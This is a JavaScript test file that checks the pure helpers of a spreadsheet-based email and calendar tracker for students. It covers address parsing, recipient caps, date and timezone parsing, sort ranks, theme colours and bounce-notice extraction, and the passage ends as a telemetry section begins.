/**
 * The courier's pure helpers, exercised outside Apps Script.
 *
 * `Code.gs` cannot run here — it needs GmailApp, CalendarApp and a
 * spreadsheet. But a few of its pieces are pure string and date work, and they
 * are the pieces most able to be quietly wrong:
 *
 *   - display-name parsing, where a comma inside a quoted name can split one
 *     person into two;
 *   - the recipient cap, which decides whether a whole conversation is
 *     dropped;
 *   - the `Pretend today is` parser, where **accepting something unreadable
 *     would be far worse than failing** — a silent fallback to today makes a
 *     broken test look like a passing one;
 *   - the timezone conversion behind it, which is the same class of bug that
 *     once put 98 fixture values out by a day.
 *
 * The Apps Script calls around them — GuestStatus, getMyStatus, the sheet
 * writes — are still only testable by running it for real.
 *
 * Run from the repo root:
 *
 *     node courier/helpers.test.js
 */

const fs = require('fs');
const path = require('path');

const src = fs.readFileSync(path.join(__dirname, 'Code.gs'), 'utf8');
const TZ = 'America/Chicago';

/** Apps Script's Utilities.formatDate, backed by Node's real timezone data. */
function formatDate(date, tz, pattern) {
  const p = Object.fromEntries(
    new Intl.DateTimeFormat('en-US', {
      timeZone: tz, year: 'numeric', month: '2-digit', day: '2-digit',
      hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false,
    }).formatToParts(date).map((x) => [x.type, x.value]),
  );
  const hh = p.hour === '24' ? '00' : p.hour;
  if (pattern === 'yyyy-MM-dd HH:mm:ss') {
    return `${p.year}-${p.month}-${p.day} ${hh}:${p.minute}:${p.second}`;
  }
  const off = Math.round(
    (Date.UTC(+p.year, +p.month - 1, +p.day, +hh, +p.minute, +p.second) - date.getTime()) / 60000,
  );
  const sign = off < 0 ? '-' : '+';
  const abs = Math.abs(off);
  const oh = String(Math.floor(abs / 60)).padStart(2, '0');
  const om = String(abs % 60).padStart(2, '0');
  return `${p.year}-${p.month}-${p.day}T${hh}:${p.minute}:${p.second}${sign}${oh}:${om}`;
}

// Code.gs reads these as free identifiers, so they have to be real globals.
global.Utilities = { formatDate };
global.SpreadsheetApp = { getActiveSpreadsheet: () => ({ getSpreadsheetTimeZone: () => TZ }) };
global.Session = { getScriptTimeZone: () => TZ };

const EXPORTS = [
  'namedAddressList_', 'firstNamedAddress_', 'bareAddress_', 'addressList_',
  'exceedsRecipientCap_', 'parsePretendText_', 'pretendNowIso_', 'declinedGuests_',
  'normaliseTyped_', 'unreadableAddressWarnings_', 'lastRowWithContact_',
  'failedRecipientsFrom_', 'isBounceSender_', 'installId_', 'telemetryPayload_', 'noticeFrom_',
  'MAX_THREAD_RECIPIENTS', 'NO_CLOCK', 'VALID_STATUSES', 'CONTRACT_VERSION',
  // The look. Colour tables and widths are data, so they are testable — and a
  // typo in a hex paints a cell black on somebody's real sheet.
  'asSheetDate_', 'STATUS_STYLE', 'NOTICE_STYLES', 'THEMES', 'CONTACTS_WIDTHS', 'FOUND_WIDTHS',
  'duplicateBlotterHeadings_', 'formulasInBlotterColumns_', 'overwrittenFormulaWarnings_',
  'rowsThatMoved_', 'sanitiseDesign_', 'safeColour_', 'safeNumber_',
  'safeCell_', 'safeServerCell_', 'eventWords_', 'statusStyle_', 'columnWidth_', 'numberFormat_', 'SETTING_KEY',
  'COURIER_VERSION', 'SCRIPT_URL',
  'instructionRows_', 'expectedSetup_', 'SETTING_INSTALL_ID', 'SETTING_HELP',
  'HELP_EMAIL', 'HELP_URL',
  'COL_NAME', 'COL_TITLE', 'COL_FIRM', 'COL_EMAIL', 'COL_CLOSED',
  'BLOTTER_COLUMNS', 'FOUND_HEADERS',
  // Sorting: the two ranking functions are pure, and getting either subtly
  // wrong reorders somebody's whole tracker without erroring.
  'titleRank_', 'stateRank_', 'pad_', 'columnLetter_',
  // The banner change. headerRow_ decides where every other row is, and the
  // row number is the contract's join key, so it is tested against a fake sheet.
  'headerRow_', 'firstDataRow_', 'resetHeaderRowCache_',
  // Formula injection: a cell beginning with = is a live formula, and every
  // one of these strings comes from the server.
  'safeCell_',
];
const box = {};
new Function('box', `${src}\nObject.assign(box, {${EXPORTS.join(', ')}});`)(box);

let fails = 0;
let checks = 0;

function eq(label, actual, expected) {
  checks += 1;
  const a = JSON.stringify(actual);
  const e = JSON.stringify(expected);
  if (a !== e) {
    fails += 1;
    console.error(`FAIL ${label}\n  expected ${e}\n  got      ${a}`);
  }
}

function refuses(label, value, midnightMeansAllDay = false) {
  checks += 1;
  try {
    box.parsePretendText_(value, midnightMeansAllDay);
    fails += 1;
    console.error(`FAIL ${label}: accepted ${JSON.stringify(value)}`);
  } catch (e) {
    if (!/not a date Blotter can read/.test(e.message)) {
      fails += 1;
      console.error(`FAIL ${label}: wrong message: ${e.message}`);
    }
  }
}

/* ------------------------------------------------------------------ *
 * Contract v2 — display names survive, bare addresses stay bare
 * ------------------------------------------------------------------ */

eq('plain address', box.namedAddressList_('jamie@x.com'), ['jamie@x.com']);
eq('named address',
  box.namedAddressList_('Barbara Barman <boone2002@att.net>'),
  ['Barbara Barman <boone2002@att.net>']);
eq('a comma inside a quoted name is not a second person',
  box.namedAddressList_('"Barman, Barbara" <boone2002@att.net>, other@y.com'),
  ['Barman, Barbara <boone2002@att.net>', 'other@y.com']);
eq('two named recipients',
  box.namedAddressList_('A B <a@x.com>, C D <c@y.com>'),
  ['A B <a@x.com>', 'C D <c@y.com>']);
eq('a mail client repeating the address as the name',
  box.namedAddressList_('jamie@x.com <jamie@x.com>'), ['jamie@x.com']);
eq('semicolon separated', box.namedAddressList_('a@x.com; B <b@y.com>'), ['a@x.com', 'B <b@y.com>']);
eq('empty header', box.namedAddressList_(''), []);
eq('a header with no address at all', box.namedAddressList_('undisclosed-recipients:;'), []);
eq('a From line keeps its name',
  box.firstNamedAddress_('Jamie Diamond <jamie@x.com>'), 'Jamie Diamond <jamie@x.com>');
eq('the bare address out of a named one', box.bareAddress_('Jamie Diamond <jamie@x.com>'), 'jamie@x.com');
eq('the bare address out of a bare one', box.bareAddress_('jamie@x.com'), 'jamie@x.com');
eq('no address at all', box.bareAddress_(''), '');
eq('addressList_ stays bare — Settings still uses it',
  box.addressList_('A B <a@x.com>, c@y.com'), ['a@x.com', 'c@y.com']);

/* ------------------------------------------------------------------ *
 * D2 — the recipient cap
 * ------------------------------------------------------------------ */

const many = (k) => Array.from({ length: k }, (_, i) => `p${i}@x.com`);
const m = (to, cc = []) => ({ to, cc });

eq('the cap is ten', box.MAX_THREAD_RECIPIENTS, 10);
eq('exactly ten is kept', box.exceedsRecipientCap_([m(many(10))]), false);
eq('eleven is skipped', box.exceedsRecipientCap_([m(many(11))]), true);
eq('To and Cc are counted together',
  box.exceedsRecipientCap_([m(many(6), many(6).map((a) => a.replace('p', 'q')))]), true);
eq('a duplicate is one person', box.exceedsRecipientCap_([m(many(10).concat(many(10)))]), false);
eq('capitalisation does not make a second person',
  box.exceedsRecipientCap_([m(many(10).concat(many(10).map((a) => a.toUpperCase())))]), false);
eq('one listserv message condemns the whole conversation',
  box.exceedsRecipientCap_([m(['a@x.com']), m(many(40)), m(['b@x.com'])]), true);
eq('an ordinary conversation survives', box.exceedsRecipientCap_([m(['a@x.com'], ['b@x.com'])]), false);
eq('display names do not break the count',
  box.exceedsRecipientCap_([m(many(11).map((a, i) => `Person ${i} <${a}>`))]), true);
eq('an empty conversation is fine', box.exceedsRecipientCap_([]), false);

/* ------------------------------------------------------------------ *
 * Contract v2 bookkeeping
 * ------------------------------------------------------------------ */

eq('the courier speaks version 4', box.CONTRACT_VERSION, 4);
eq('eight statuses', box.VALID_STATUSES.length, 8);
eq('Call cancelled is accepted', box.VALID_STATUSES.indexOf('Call cancelled') !== -1, true);
eq('a clockless cell is an em dash', box.NO_CLOCK, '—');

/* ------------------------------------------------------------------ *
 * Live-test defect 1 — a hand-typed address that silently never matched.
 *
 * Jon typed `jon@un-claude.com` and the row read Not emailed forever; he
 * pasted the identical address and it worked. Autocorrect had replaced the
 * hyphen with an en dash. Capitalisation was never the problem — matching
 * lowercases everywhere.
 * ------------------------------------------------------------------ */

eq('an ordinary typed address still works', box.addressList_('jon@un-claude.com'), ['jon@un-claude.com']);
eq('en dash (U+2013), which is what autocorrect actually produced',
  box.addressList_('jon@un–claude.com'), ['jon@un-claude.com']);
eq('non-breaking hyphen (U+2011)',
  box.addressList_('jon@un‑claude.com'), ['jon@un-claude.com']);
eq('em dash (U+2014)', box.addressList_('jon@un—claude.com'), ['jon@un-claude.com']);
eq('minus sign (U+2212)', box.addressList_('jon@un−claude.com'), ['jon@un-claude.com']);
eq('a non-breaking space around it', box.addressList_(' jon@acme.com '), ['jon@acme.com']);
eq('a zero-width space pasted into the middle',
  box.addressList_('jon@ac​me.com'), ['jon@acme.com']);
eq('a full-width at sign', box.addressList_('jon＠acme.com'), ['jon@acme.com']);
eq('capitals are left exactly as typed — matching lowercases later',
  box.addressList_('Jon@Un-Claude.com'), ['Jon@Un-Claude.com']);
eq('a real address is never altered', box.normaliseTyped_('a-b@c-d.com'), 'a-b@c-d.com');
eq('and the display-name path normalises too',
  box.namedAddressList_('Jon <jon@un–claude.com>'), ['Jon <jon@un-claude.com>']);

/* The general defence: say so when a row has a person and no usable address.
   There will always be a character nobody anticipated. */
eq('a garbled address names the row and quotes the cell',
  box.unreadableAddressWarnings_([{ row: 7, name: 'Jane Doe', cell: 'jane@acme,com' }]),
  ['Row 7 (Jane Doe): "jane@acme,com" is not an email address Blotter can read, ' +
   'so the row will stay "Not emailed". Retyping it usually fixes it. Autocorrect ' +
   'sometimes replaces a hyphen with a dash that looks identical.']);
eq('an empty address cell says something different and true',
  box.unreadableAddressWarnings_([{ row: 3, name: 'Owen Sherry', cell: '' }]),
  ['Row 3 (Owen Sherry) has no email address, so Blotter cannot find their mail ' +
   'and the row will stay "Not emailed".']);
eq('nothing wrong, nothing said', box.unreadableAddressWarnings_([]), []);

/* ------------------------------------------------------------------ *
 * Live-test defect 3 — an approved contact landed at row 996.
 *
 * `getLastRow()` counts a column of unticked checkboxes as content, because an
 * unticked checkbox stores FALSE. The append must follow the last row that
 * holds a person instead.
 * ------------------------------------------------------------------ */

/* The stub gained getSheetId, getName, getMaxRows and getLastColumn when the
   banner arrived: `lastRowWithContact_` now derives its window from
   `headerRow_`, so it needs a sheet the search can look at. Row 1 holds the
   headers here, which is the pre-banner layout — so these cases also prove the
   old behaviour is unchanged. */
let sheetOfId = 0;
const sheetOf = (names, emails, lastRow) => {
  const id = ++sheetOfId;
  const grid = [['Name', 'Email']].concat(names.map((n, i) => [n, emails[i] ?? '']));
  return {
    sheet: {
      getSheetId: () => id,
      getName: () => 'Contacts',
      getMaxRows: () => lastRow,
      getLastColumn: () => 2,
      getLastRow: () => lastRow,
      getRange: (row, col, height, numCols) => ({
        getValues: () => {
          // The header search asks for a block of rows and every column.
          if (numCols && numCols > 1) {
            return grid.slice(row - 1, row - 1 + height)
              .map((r) => Array.from({ length: numCols }, (_, i) => r[i] ?? ''));
          }
          // Everything else asks for one column, starting at the first data row.
          const src = col === 1 ? names : emails;
          return src.slice(row - 2, row - 2 + height).map((v) => [v ?? '']);
        },
      }),
    },
    cols: { name: 1, email: 2 },
  };
};

eq('three contacts and 900 rows of checkboxes below them',
  box.lastRowWithContact_(sheetOf(['A', 'B', 'C', ...Array(900).fill('')],
                                  ['a@x.com', 'b@x.com', 'c@x.com', ...Array(900).fill('')], 995)),
  4);
eq('a row with only an email still counts as a person',
  box.lastRowWithContact_(sheetOf(['A', ''], ['a@x.com', 'b@x.com'], 995)), 3);
eq('a row with only a name counts too (Owen Sherry has no address)',
  box.lastRowWithContact_(sheetOf(['A', 'Owen Sherry'], ['a@x.com', ''], 995)), 3);
eq('a gap in the middle does not truncate the list',
  box.lastRowWithContact_(sheetOf(['A', '', 'C'], ['a@x.com', '', 'c@x.com'], 995)), 4);
eq('an empty sheet appends at row 2',
  box.lastRowWithContact_(sheetOf([], [], 1)), 1);
eq('a sheet of nothing but checkboxes appends at row 2',
  box.lastRowWithContact_(sheetOf(Array(900).fill(''), Array(900).fill(''), 901)), 1);

/* ------------------------------------------------------------------ *
 * D17 — the time machine. What it accepts, and what it must refuse.
 * ------------------------------------------------------------------ */

const P = (t, midnight = false) => box.parsePretendText_(t, midnight);

eq('a date with no time means the end of that day',
  P('2026-09-05'), { y: 2026, mo: 9, d: 5, h: 23, mi: 59, s: 59 });
eq('a date with a time means that time',
  P('2026-09-05 14:30'), { y: 2026, mo: 9, d: 5, h: 14, mi: 30, s: 0 });
eq('the T separator works too',
  P('2026-09-05T14:30'), { y: 2026, mo: 9, d: 5, h: 14, mi: 30, s: 0 });
eq('seconds are allowed', P('2026-09-05T14:30:09'), { y: 2026, mo: 9, d: 5, h: 14, mi: 30, s: 9 });
eq('the US format Sheets displays', P('9/5/2026'), { y: 2026, mo: 9, d: 5, h: 23, mi: 59, s: 59 });
eq('the US format with a time',
  P('09/05/2026 08:15'), { y: 2026, mo: 9, d: 5, h: 8, mi: 15, s: 0 });
eq('a date-formatted cell reads back as midnight, and means all day',
  P('2026-09-05 00:00:00', true), { y: 2026, mo: 9, d: 5, h: 23, mi: 59, s: 59 });
eq('a midnight somebody actually typed is respected',
  P('2026-09-05 00:00', false), { y: 2026, mo: 9, d: 5, h: 0, mi: 0, s: 0 });
eq('a leap day is a real date', P('2024-02-29'), { y: 2024, mo: 2, d: 29, h: 23, mi: 59, s: 59 });

refuses('prose', 'tomorrow');
refuses('a day that does not exist', '2026-02-30');
refuses('February 29 in a non-leap year', '2025-02-29');
refuses('a twenty-fifth hour', '2026-09-05 25:00');
refuses('a sixtieth minute', '2026-09-05 12:60');
refuses('a thirteenth month', '2026-13-01');
refuses('half a date', '2026-09');
refuses('a raw spreadsheet serial number', '45900');
refuses('a date with words after it', '2026-09-05 lunchtime');
refuses('a format we do not accept', '05.09.2026');

/* The offset must follow the pretend DATE, not today's. */
eq('blank means the real clock', box.pretendNowIso_(''), '');
eq('an absent cell means the real clock', box.pretendNowIso_(undefined), '');
eq('a winter date carries the winter offset',
  box.pretendNowIso_('2026-01-15'), '2026-01-15T23:59:59-06:00');
eq('a summer date carries the summer offset',
  box.pretendNowIso_('2026-07-15'), '2026-07-15T23:59:59-05:00');
eq('a summer date with a time', box.pretendNowIso_('2026-07-15 14:30'), '2026-07-15T14:30:00-05:00');
eq('the morning the clocks go forward', box.pretendNowIso_('2026-03-08 01:30'), '2026-03-08T01:30:00-06:00');
eq('after the clocks go forward', box.pretendNowIso_('2026-03-08 03:30'), '2026-03-08T03:30:00-05:00');
eq('the end of the day the clocks go forward',
  box.pretendNowIso_('2026-03-08'), '2026-03-08T23:59:59-05:00');
eq('the end of the day the clocks go back',
  box.pretendNowIso_('2026-11-01'), '2026-11-01T23:59:59-06:00');
eq('a date from the 2024 season', box.pretendNowIso_('2024-02-15'), '2024-02-15T23:59:59-06:00');
eq('a Sheets date cell becomes the end of that day',
  box.pretendNowIso_(new Date('2026-07-15T05:00:00Z')), '2026-07-15T23:59:59-05:00');

/* ------------------------------------------------------------------ *
 * Who declined — and what it COSTS to find out.
 *
 * This runs against every event in the window, and a student's calendar can
 * hold thousands. The first version asked Google for the student's own answer
 * on every one of them, including the solo events that cannot have been
 * declined at all, and a real run went from about 30 seconds to 83. So the
 * call count is asserted here, not just the answer.
 * ------------------------------------------------------------------ */

global.CalendarApp = { GuestStatus: { YES: 'YES', NO: 'NO', MAYBE: 'MAYBE', INVITED: 'INVITED', OWNER: 'OWNER' } };
global.Session = { getEffectiveUser: () => ({ getEmail: () => 'student@gmail.com' }) };

let statusCalls = 0;
const guest = (email, status) => ({
  getEmail: () => email,
  getGuestStatus: () => { statusCalls += 1; return status; },
});
const event = (myStatus) => ({
  getMyStatus: () => { statusCalls += 1; if (myStatus === undefined) throw new Error('no status'); return myStatus; },
});
const declinedBy = (guests, myStatus) => {
  statusCalls = 0;
  const out = guests.length === 0 ? [] : box.declinedGuests_(event(myStatus), guests);
  return out;
};

eq('the banker declined',
  declinedBy([guest('banker@firm.com', 'NO'), guest('student@gmail.com', 'OWNER')], 'OWNER'),
  ['banker@firm.com']);
eq('nobody declined',
  declinedBy([guest('banker@firm.com', 'YES'), guest('student@gmail.com', 'OWNER')], 'OWNER'), []);
eq('a maybe is not a decline',
  declinedBy([guest('banker@firm.com', 'MAYBE')], 'OWNER'), []);
eq('the student declined, reported as OWNER in the guest list',
  declinedBy([guest('banker@firm.com', 'YES'), guest('student@gmail.com', 'OWNER')], 'NO'),
  ['student@gmail.com']);
eq('the student declined and the guest list says so',
  declinedBy([guest('student@gmail.com', 'NO')], 'NO'), ['student@gmail.com']);
eq('and it is not listed twice',
  declinedBy([guest('student@gmail.com', 'NO'), guest('student@gmail.com', 'NO')], 'NO'),
  ['student@gmail.com']);
eq('an event with no my-status to report does not throw',
  declinedBy([guest('banker@firm.com', 'NO')], undefined), ['banker@firm.com']);

/* The cost, pinned. */
declinedBy([], 'OWNER');
eq('a solo event asks Google nothing at all', statusCalls, 0);
declinedBy([guest('student@gmail.com', 'NO')], 'NO');
eq('the guest list answering means my-status is not asked again', statusCalls, 1);
declinedBy([guest('banker@firm.com', 'YES'), guest('student@gmail.com', 'OWNER')], 'OWNER');
eq('otherwise: one call per guest, plus one for the student', statusCalls, 3);


// ---------------------------------------------------------------------------
/** The harness asserts with eq(label, actual, expected); this is the boolean form. */
function ok(label, actual) { eq(label, !!actual, true); }

const { titleRank_, stateRank_, pad_, columnLetter_ } = box;
const { asSheetDate_, STATUS_STYLE, THEMES, CONTACTS_WIDTHS, FOUND_WIDTHS,
        COL_NAME, COL_TITLE, COL_FIRM, COL_EMAIL, COL_CLOSED,
        BLOTTER_COLUMNS, FOUND_HEADERS, VALID_STATUSES } = box;

// asSheetDate_ — the fix for `Next call` rendering a raw ISO timestamp.
//
// The trap being guarded is the one this project has already paid for once:
// `new Date('2026-09-02')` is UTC midnight, which is the evening of September
// 1st anywhere in the Americas. A bare date must be built from its parts.
// ---------------------------------------------------------------------------
{
  const bare = asSheetDate_('2026-09-02');
  ok('bare date is a Date', bare instanceof Date);
  ok('bare date keeps its own day, not UTC midnight', bare.getFullYear() === 2026 && bare.getMonth() === 8 && bare.getDate() === 2);
  // Noon, and the reason is the whole point of this test. The script runs in
  // the manifest's timezone and Sheets renders in the spreadsheet's, which the
  // student sets. Midnight has no slack to absorb the gap, so a Pacific sheet
  // rendered midnight Chicago as 10pm the day before and every date read one
  // day early.
  //
  // Noon alone was not enough. It cured the west and left the east reading a
  // day late, because the gap between Chicago and Auckland is eighteen hours
  // and slack cannot close it. The date is built in the student's own zone
  // now, so the assertion is about what the STUDENT sees — which is the thing
  // that was wrong both times. See "a bare date keeps its day in every
  // timezone" below.
  ok('bare date sits at noon in the sheet timezone',
     formatDate(bare, TZ, 'yyyy-MM-dd HH:mm:ss') === '2026-09-02 12:00:00');

  const stamped = asSheetDate_('2026-09-03T14:00:00-07:00');
  ok('full timestamp is a Date', stamped instanceof Date);
  ok('full timestamp keeps its instant', stamped.getTime() === Date.parse('2026-09-03T14:00:00-07:00'));

  ok('null becomes an empty cell', asSheetDate_(null) === '');
  ok('undefined becomes an empty cell', asSheetDate_(undefined) === '');
  ok('empty string stays empty', asSheetDate_('') === '');

  // Passing an unparseable value through untouched is the point: a visibly odd
  // string is recoverable, a confidently wrong date is not.
  ok('a dash is left alone', asSheetDate_('—') === '—');
  ok('nonsense is left alone', asSheetDate_('next tuesday') === 'next tuesday');
  ok('a nearly-ISO string is left alone', asSheetDate_('2026-13-45T99:00:00Z') === '2026-13-45T99:00:00Z');

  // Every date the engine can send, across a DST boundary in both directions.
  ['2026-01-15', '2026-03-08', '2026-03-09', '2026-11-01', '2026-12-31'].forEach((iso) => {
    const d = asSheetDate_(iso);
    const parts = iso.split('-').map(Number);
    ok('round trip ' + iso, d.getFullYear() === parts[0] && d.getMonth() === parts[1] - 1 && d.getDate() === parts[2]);
  });
}

// A bare date keeps its day in every timezone a student can set.
//
// This is the check the project has now paid for twice. The first version
// built midnight in the script's zone and every sheet WEST of Chicago read a
// day early. The second built noon in the script's zone, which fixed the west
// and broke everything at UTC+7 or further EAST, where noon Chicago is already
// tomorrow. Neither fault was visible from Chicago, and the suite pinned the
// sheet timezone to Chicago, so neither fault was visible here either.
//
// Every case below fails against both of those versions.
// ---------------------------------------------------------------------------
{
  /** A fresh sandbox whose spreadsheet timezone is `tz`. */
  function boxFor(tz) {
    const saved = global.SpreadsheetApp;
    global.SpreadsheetApp = { getActiveSpreadsheet: () => ({ getSpreadsheetTimeZone: () => tz }) };
    try {
      const b = {};
      new Function('box', `${src}\nObject.assign(box, {${EXPORTS.join(', ')}});`)(b);
      // `studentTimeZone_` caches on first use, and every call below happens
      // after the stub is put back. Prime it while the stub still says `tz`.
      b.asSheetDate_('2000-01-01');
      return b;
    } finally {
      global.SpreadsheetApp = saved;
    }
  }

  const zones = [
    'Pacific/Honolulu', 'America/Anchorage', 'America/Los_Angeles', 'America/Denver',
    'America/Chicago', 'America/New_York', 'America/Sao_Paulo', 'Europe/London',
    'Europe/Berlin', 'Africa/Johannesburg', 'Asia/Kolkata', 'Asia/Dhaka',
    'Asia/Bangkok', 'Asia/Singapore', 'Asia/Tokyo', 'Australia/Sydney',
    'Pacific/Auckland', 'Pacific/Kiritimati', 'Etc/UTC',
  ];
  // Midsummer and midwinter, so both sides of every DST rule are covered, plus
  // the two days the American clocks actually move.
  const dates = ['2026-01-06', '2026-03-08', '2026-07-04', '2026-11-01', '2026-12-31'];

  zones.forEach((tz) => {
    const asDate = boxFor(tz).asSheetDate_;
    dates.forEach((iso) => {
      const rendered = formatDate(asDate(iso), tz, 'yyyy-MM-dd HH:mm:ss');
      ok(`${iso} still reads ${iso} on a sheet set to ${tz}`, rendered.slice(0, 10) === iso);
    });
  });
}

// ---------------------------------------------------------------------------
// Sorting. Titles are free text a student typed, so the ranking has to survive
// real-world spellings — and must not read "Senior Vice President" as an
// analyst because it happens to contain a word from a lower rank.
// ---------------------------------------------------------------------------
{
  const rankOf = (t) => titleRank_(t);
  ok('analyst is most junior', rankOf('Analyst') < rankOf('Associate'));
  ok('associate below VP', rankOf('Associate') < rankOf('Vice President'));
  ok('VP below MD', rankOf('Vice President') < rankOf('Managing Director'));

  // The real spellings out of Jon's own 2024 tracker.
  ['Analyst', 'analyst', 'Summer Analyst', 'Senior Analyst'].forEach((t) =>
    ok('reads as analyst: ' + t, rankOf(t) === rankOf('Analyst')));
  ['Associate', 'associate ', 'Senior Associate'].forEach((t) =>
    ok('reads as associate: ' + t, rankOf(t) === rankOf('Associate')));
  ['Vice President', 'VP', 'vp', 'SVP', 'Senior Vice President'].forEach((t) =>
    ok('reads as VP: ' + t, rankOf(t) === rankOf('Vice President')));
  ['MD', 'Managing Director', 'managing director'].forEach((t) =>
    ok('reads as MD: ' + t, rankOf(t) === rankOf('Managing Director')));

  // The trap: a longer title containing a more junior word.
  ok('Senior Vice President is not an analyst', rankOf('Senior Vice President') > rankOf('Analyst'));
  ok('Managing Director is not an associate', rankOf('Managing Director') > rankOf('Associate'));

  ok('an empty title sinks', rankOf('') > rankOf('Managing Director'));
  ok('an unknown title sinks', rankOf('Chief Vibes Officer') > rankOf('Managing Director'));

  // State order: what you owe, first.
  VALID_STATUSES.forEach((st) => ok('every status ranks: ' + st, typeof stateRank_(st) === 'number'));
  // Jon's exact sequence, pinned in order so a future reshuffle has to be
  // deliberate rather than accidental.
  ['Replied', 'Sent', 'Not emailed', 'Bounced', 'Call done', 'Call scheduled',
   'Call cancelled', 'Closed'].forEach((st, i, all) => {
    if (i === 0) return;
    ok(all[i - 1] + ' comes before ' + st, stateRank_(all[i - 1]) < stateRank_(st));
  });
  ok('the email states group ahead of the call states',
    stateRank_('Bounced') < stateRank_('Call done'));
  ok('Closed sinks below everything', VALID_STATUSES.filter((s) => s !== 'Closed')
    .every((s) => stateRank_(s) < stateRank_('Closed')));
  ok('an unknown status does not outrank a real one', stateRank_('Banana') > stateRank_('Sent'));

  // The sort key is text, so numbers must be padded or 10 sorts before 9.
  ok('pad_ orders numerically as text', pad_(9) < pad_(10));
  ok('pad_ orders 2 before 100', pad_(2) < pad_(100));
  ok('pad_ is fixed width', pad_(1).length === pad_(99999).length);

  // The closed-row rule builds an A1 reference by hand.
  [[1, 'A'], [26, 'Z'], [27, 'AA'], [28, 'AB'], [52, 'AZ'], [53, 'BA']].forEach(([n, l]) =>
    ok('column ' + n + ' is ' + l, columnLetter_(n) === l));
}

// ---------------------------------------------------------------------------
// The theme tables. Every status the contract allows must have a colour, and
// every colour must be a real hex — a typo here paints a cell black.
// ---------------------------------------------------------------------------
{
  VALID_STATUSES.forEach((status) => {
    const style = STATUS_STYLE[status];
    ok('status has a style: ' + status, !!style);
    ok('status fill is a hex: ' + status, /^#[0-9a-f]{6}$/i.test(style.bg));
    ok('status text is a hex: ' + status, /^#[0-9a-f]{6}$/i.test(style.fg));
  });
  ok('no style exists for a status the contract forbids',
    Object.keys(STATUS_STYLE).every((k) => VALID_STATUSES.indexOf(k) !== -1));

  ['hero', 'zoned'].forEach((name) => {
    const t = THEMES[name];
    ok('theme exists: ' + name, !!t);
    ok('theme has both header tints: ' + name, /^#[0-9a-f]{6}$/i.test(t.manualHeader) && /^#[0-9a-f]{6}$/i.test(t.keptHeader));
    ok('theme divider is a hex: ' + name, /^#[0-9a-f]{6}$/i.test(t.dividerColour));
  });
  ok('hero leaves data rows unfilled', THEMES.hero.manualRow === null && THEMES.hero.keptRow === null);
  ok('zoned fills both zones', /^#[0-9a-f]{6}$/i.test(THEMES.zoned.manualRow) && /^#[0-9a-f]{6}$/i.test(THEMES.zoned.keptRow));

  // Each zone's data fill must be a LIGHTER version of its own header tint —
  // strictly between white and that header, on every channel.
  //
  // This is deliberately weaker than the rule the design research claimed. It
  // said both fills sit 45% of the way from white to their header; that holds
  // for the manual pair (0.44 / 0.46 / 0.43) and is simply untrue of the kept
  // pair (0.25 / 0.39 / 0.57), which was picked by eye. The ratified colours
  // are the colours, so the assertion had to become the invariant that
  // actually matters: get a fill darker than its header and the two zones
  // invert, which nothing else would catch.
  const mix = (hex) => hex.slice(1).match(/../g).map((h) => parseInt(h, 16));
  const lighterThanHeader = (row, header) => {
    const r = mix(row), h = mix(header);
    return [0, 1, 2].every((i) => r[i] > h[i] && r[i] < 255);
  };
  ok('manual fill is lighter than its header, and not white',
    lighterThanHeader(THEMES.zoned.manualRow, THEMES.zoned.manualHeader));
  ok('kept fill is lighter than its header, and not white',
    lighterThanHeader(THEMES.zoned.keptRow, THEMES.zoned.keptHeader));

  // The two zones must stay visibly different from each other, or the whole
  // point of the split is lost to a rounding error.
  ok('the two zone fills are not the same colour', THEMES.zoned.manualRow !== THEMES.zoned.keptRow);
  ok('the two header tints are not the same colour', THEMES.zoned.manualHeader !== THEMES.zoned.keptHeader);

  // A width for every column the sheet writes, or a column silently keeps
  // Sheets' 100px default and the layout quietly drifts.
  [COL_NAME, COL_TITLE, COL_FIRM, COL_EMAIL].concat(BLOTTER_COLUMNS).concat([COL_CLOSED]).forEach((h) => {
    ok('a width is set for ' + h, typeof CONTACTS_WIDTHS[h] === 'number' && CONTACTS_WIDTHS[h] > 40);
  });
  FOUND_HEADERS.forEach((h) => {
    ok('a Found width is set for ' + h, typeof FOUND_WIDTHS[h] === 'number' && FOUND_WIDTHS[h] > 40);
  });
}

/* ------------------------------------------------------------------ *
 * Contract v4 — the body never leaves the account.
 *
 * The engine read a body in exactly one place: to find which address a
 * delivery-failure notice was complaining about. That extraction lives here
 * now, so the text stops crossing the wire. The bounce below is the real one
 * from the 2024 season, and its `Status:` code LIES — it reports 4.4.2, a
 * temporary class, while its own text says the address does not exist. An
 * engine keyed on `5.x` misses exactly the address a student burns three
 * attempts on, which is why this is keyed on the named recipient instead.
 * ------------------------------------------------------------------ */

const STIFEL_BOUNCE =
  "** Address not found **\n\nYour message wasn't delivered to sean.kang@stifel.com " +
  "because the address couldn't be found, or is unable to receive mail.\n\n" +
  "The response from the remote server was:\n550 #5.1.0 Address rejected.\n" +
  "Final-Recipient: rfc822; sean.kang@stifel.com\nAction: failed\nStatus: 4.4.2\n" +
  "Remote-MTA: dns; smtp.gslb.stifel.com.\n" +
  "Diagnostic-Code: smtp; 550 #5.1.0 Address rejected.\n" +
  "Last-Attempt-Date: Tue, 30 Jan 2024 21:15:32 -0800 (PST)";

eq('the real Stifel bounce yields the dead address',
  box.failedRecipientsFrom_(STIFEL_BOUNCE), ['sean.kang@stifel.com']);
eq('named once, not once per mention',
  box.failedRecipientsFrom_(STIFEL_BOUNCE).length, 1);
eq('the daemon itself is never a failed recipient',
  box.failedRecipientsFrom_('mailer-daemon@googlemail.com could not reach a@b.com'), ['a@b.com']);
eq('postmaster likewise',
  box.failedRecipientsFrom_('postmaster@x.com says c@d.com failed'), ['c@d.com']);
eq('two dead addresses in one notice',
  box.failedRecipientsFrom_('failed: a@x.com and also b@y.com'), ['a@x.com', 'b@y.com']);
eq('a notice naming nobody yields nothing',
  box.failedRecipientsFrom_('Delivery failed permanently.'), []);
eq('an empty body yields nothing', box.failedRecipientsFrom_(''), []);
eq('addresses come back lowercased, as matching expects',
  box.failedRecipientsFrom_('Sean.Kang@Stifel.com failed'), ['sean.kang@stifel.com']);

eq('mailer-daemon is a bounce sender', box.isBounceSender_('mailer-daemon@googlemail.com'), true);
eq('postmaster is a bounce sender', box.isBounceSender_('POSTMASTER@x.com'), true);
eq('a banker is not', box.isBounceSender_('jamie@jpmorgan.com'), false);
eq('nothing is not', box.isBounceSender_(''), false);

/* ------------------------------------------------------------------ *
 * The install id, and what telemetry is allowed to carry.
 * ------------------------------------------------------------------ */

const props = {};
global.PropertiesService = {
  getScriptProperties: () => ({
    getProperty: (k) => (k in props ? props[k] : null),
    setProperty: (k, v) => { props[k] = v; },
  }),
};
